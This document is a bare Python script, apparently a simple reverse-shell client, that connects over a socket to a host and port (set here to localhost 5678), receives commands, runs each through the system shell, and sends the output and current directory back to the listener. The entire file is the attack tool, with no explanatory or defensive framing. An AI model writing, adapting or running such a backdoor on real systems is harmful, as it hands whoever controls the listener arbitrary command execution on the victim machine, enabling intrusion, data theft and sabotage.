import os, socket, subprocess

sock = socket.socket()
host = "127.0.0.1"
port = 5678

sock.connect((host, port))

while True:
    data = sock.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    elif len(data) > 0:
        print(data[:].decode("utf-8"))
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        print(output_str)
        sock.send(str.encode(output_str + str(os.getcwd()) + "> "))

